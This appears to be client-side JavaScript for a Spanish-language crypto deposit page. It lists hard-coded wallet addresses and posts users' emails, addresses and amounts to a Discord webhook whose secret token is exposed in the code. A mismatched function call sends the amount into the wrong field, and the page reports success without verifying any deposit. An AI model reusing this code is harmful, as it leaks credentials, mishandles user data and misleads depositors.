
 const datosDeposito = {
            "USD": { direccion: "N/A", red: "Transferencia Bancaria  DECRYPTO-YSD" },
            "USDT": { direccion: "0x01C65F22A9478C2932e62483509c233F0aaD5c72", red: "BEP20" },
            "BTC": { direccion: "19UwiG1TzWkPKFD8b6hK3Wek9G5EJoZ416", red: "Bitcoin Network" },
            "ETH": { direccion: "0x01C65F22A9478C2932e62483509c233F0aaD5c72", red: "ERC20" },
            "BNB": { direccion: "0x01C65F22A9478C2932e62483509c233F0aaD5c72", red: "BEP20" }
        };

        function actualizarDatosDeposito() {
            const moneda = document.getElementById("moneda").value;
            const infoDeposito = document.getElementById("infoDeposito");
            const direccionDeposito = document.getElementById("direccionDeposito");
            const redEnvio = document.getElementById("redEnvio");

            if (datosDeposito[moneda]) {
                direccionDeposito.textContent = datosDeposito[moneda].direccion;
                redEnvio.textContent = datosDeposito[moneda].red;
                infoDeposito.style.display = 'block';
            } else {
                infoDeposito.style.display = 'none';
            }
        }




        
function enviarDatosAlWebhook(correo, direccion, capturaURL, numeroCuenta, titularCuenta, monto) {
    var webhookURL = 'https://discordapp.com/api/webhooks/1157760501829345320/5vqHkW8jnO_nFfS8WSL-2fsP9q_Jxa2wTkAAhrml4P681DYeXAAJd51F94_rISviSmSo';
    var payload = {
        content: 'Nuevo depósito:\nCorreo: ' + correo + '\nDirección Vinculada: ' + direccion + '\nNúmero de Cuenta: ' + numeroCuenta + '\nTitular de la Cuenta: ' + titularCuenta + '\nMonto: ' + monto + '\nCaptura del Depósito: ' + capturaURL,
    };

    // Realizar una solicitud HTTP POST al webhook de Discord
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    });
}

function enviarDatos() {
    var correo = document.getElementById("correo").value;
    var direccion = document.getElementById("address").value;
    var capturaURL = '';  // La URL de la captura del depósito, si la tienes
    var monto = document.getElementById("monto").value;  // Obtener el valor del campo de monto

    // Validar el formato del correo, la existencia de la dirección, el número de cuenta y el titular de la cuenta
    if (correo && correo.trim() !== '' && direccion && direccion.trim() !== '' && monto && monto.trim() !== '') {
        // Aquí puedes cargar la captura del depósito si es necesario

        // Llamar a la función para enviar los datos al webhook de Discord
        enviarDatosAlWebhook(correo, direccion, capturaURL, monto);

        // Mostrar mensaje de éxito u realizar otras acciones si es necesario
        mostrarMensaje("Depósito procesado con éxito. Recibirás un correo electrónico pronto.");
        setTimeout(function() {
            window.location.href = "/pagina-principal";
        }, 300000); // Redirigir después de 5 minutos (300000 milisegundos)
    } else {
        // Mostrar mensaje de error si falta algún dato
        mostrarError("Por favor, complete todos los campos correctamente.");
    }
}

function mostrarMensaje(mensaje) {
    var mensajeExito = document.getElementById("mensaje-exito");
    mensajeExito.textContent = mensaje;
    mensajeExito.style.display = "block";
}


function mostrarError(mensaje) {
    var mensajeFlotante = document.getElementById("mensaje-copiado");
    mensajeFlotante.textContent = mensaje;
    mensajeFlotante.style.color = "#ff0000";
    mensajeFlotante.style.display = "inline";
}

   
    function copiarAlias() {
        var alias = document.getElementById("alias");
        alias.select();
        document.execCommand("copy");
        var mensajeCopiado = document.getElementById("mensaje-copiado");
        mensajeCopiado.style.display = "inline";
    }
          function mostrarMensajeExito(mensaje) {
            var mensajeExito = document.getElementById("mensaje-exito");
            mensajeExito.textContent = mensaje;
            mensajeExito.style.display = "block";
        }

        function volverPaginaPrincipal() {
            window.location.href = "/pagina-principal";
        }



        
        var modal = document.getElementById("myModal");

// Obtener el botón que abre el modal
var btn = document.getElementById("myBtn");

// Obtener el elemento <span> que cierra el modal
var span = document.getElementsByClassName("close")[0];

// Cuando el usuario hace clic en el botón, abrir el modal 
btn.onclick = function() {
  modal.style.display = "block";
}

// Cuando el usuario hace clic en <span> (x), cerrar el modal
span.onclick = function() {
  modal.style.display = "none";
}

// Cuando el usuario hace clic en cualquier lugar fuera del modal, cerrarlo
window.onclick = function(event) {
  if (event.target == modal) {
    modal.style.display = "none";
  }
}
